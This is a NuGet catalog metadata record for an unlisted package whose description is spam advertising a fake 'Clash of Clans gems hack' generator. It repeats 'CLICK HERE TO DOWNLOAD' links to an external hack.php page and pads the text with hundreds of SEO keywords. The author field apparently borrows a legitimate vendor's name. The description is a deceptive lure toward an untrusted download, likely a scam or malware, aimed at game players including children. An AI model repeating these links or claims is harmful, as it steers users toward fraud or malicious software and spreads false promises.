{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-ioj.6.5.73.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "553ec314-3469-45b5-84dd-b57a4f1cb4f5",
  "catalog:commitTimeStamp": "2022-01-29T00:00:28.9377769Z",
  "created": "2022-01-26T17:58:19.267Z",
  "description": "# _Clash Of Clans Gems hack Working 2022 Version ioj\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n\nClash of Clans Hack Mod cheat free gems privet server ⚠☢☣ The most asked question! I make Clash of Clan videos. ⚓ Please Like,Share And. Why? - Because the ultimate Clash of Clans Hack tool is right here, waiting for you to grab it! What this tool exactly is? - The tool is a cheat application. Free Clash Of Clans Online Generator COC Gems Hack. It's Here: download Hello Visitors, Have you got tired finding Free.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n · Go Here: download clash of clans hack gems generator clash of clans hack gems and coins clash of clans hack . Clash Of Clans Gems Hack - CNET Download Showing of Results for \"clash of clans gems hack\" Clash of Clans Free Build your village, raise a .  · Clash of Clans hack is a really good way to get unlimited gems, unlimited gold and unlimited elixir in Clash of Clans. Clash of Clans is a really popular game among children and youth for its simplicity and good graphics. This game is made by supercell in and after so many years this is still popular among children and youth.\n\nclash of clans gems hack app, clash of clans gems hack generator, clash of clans gems hack app download, clash of clans gems hack download, clash of clans gems hack mod apk, clash of clans gems hack 2021, clash of clans gems hack file, clash of clans gems hack ios, clash of clans gems hack apk download, clash of clans gems hack apk mod, clash of clans hack gems and coins, clash of clans hack gems android, clash of clans hack gems and, clash of clans gems cheat app, a clash of clans gem hack, clash of clans gems hack 2020, clash of clans gems hack apk, clash of clans gem box hack, gems clash of clans hack.blogspot, clash of clans buy gems hack, bluestacks clash of clans gem hack, clash of clans gems hack.com, clash of clans gem hack cydia source, clash of clans hack gems coins and elixir, clash of clans hack gems coins, clash of clans gems cheat code, clash of clans gem calculator hack, clash of clans hack gems cheats 100 free download no survey, clash of clans hack gems coc, clash of clans gems hack download link, clash of clans unlimited gems hack download, clash of clans gems hack version download, clash of clans free gems hack download for pc, clash of clans gem hack pc download, free clash of clans gems hack apk download for android, clash of clans gems cheat engine, clash of clans hack gems gold and elixir generator, clash of clans easy gems hack, clash of clans gems gold and elixir hack, how to hack clash of clans gems cheat engine, clash of clans easy gems cheat, clash of clans hack unlimited gems gold elixir dark elixir download, clash of clans gems hack free, clash of clans gems hack free online, clash of clans gems hack for ios, clash of clans hack gems free no download, clash of clans gems hack apk free download, clash of clans unlimited gems hack free download, clash of clans hack gems generator free download, free clash of clans gems hack, free gems clash of clans ios, free gems on clash of clans, clash of clans gems hack game guardian, clash of clans hack gems generator no human verification, clash of clans hack gems generator without human verification or survey, clash of clans hack gems generator online ios, clash of clans hack gems generator android, gem hack for clash of clans, gem cheats for clash of clans, clash of clans gems hack hindi, clash of clans gems hack no human verification, clash of clans gems hack without human verification, clash of clans gem hack no human verification or survey 2020, clash of clans gem hack no human verification or survey 2021, clash of clans gem hack no human verification or survey 2019, clash of clans gems hack online no human verification, clash of clans gem hack reddit, free gems on clash of clans hac",
  "id": "_Clash-Of-Clans-Gems-hack-Working-2022-Version-ioj",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:42.907Z",
  "listed": false,
  "packageHash": "76jPRdHbCCGbhRVt8kW4+hJbmuOlU/s2E9W52OqeD0mwOopaexAC33FMFYiwNB2dhV/EX31b08VpFNGepRSLCQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11414,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Clash-Of-Clans-Gems-hack-Working-2022-Version-ioj",
  "verbatimVersion": "6.5.73",
  "version": "6.5.73",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-ioj.6.5.73.json#qretiaibhh.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1283,
      "fullName": "qretiaibhh.nuspec",
      "length": 4481,
      "name": "qretiaibhh.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-ioj.6.5.73.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}